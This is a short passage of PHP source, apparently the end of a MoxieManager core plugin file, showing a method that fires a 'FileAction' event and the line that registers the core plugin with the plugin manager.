		return MOXMAN::getPluginManager()->get("core")->fire("FileAction", $args);
	}
}

MOXMAN::getPluginManager()->add("core", new MOXMAN_Core_Plugin());

?>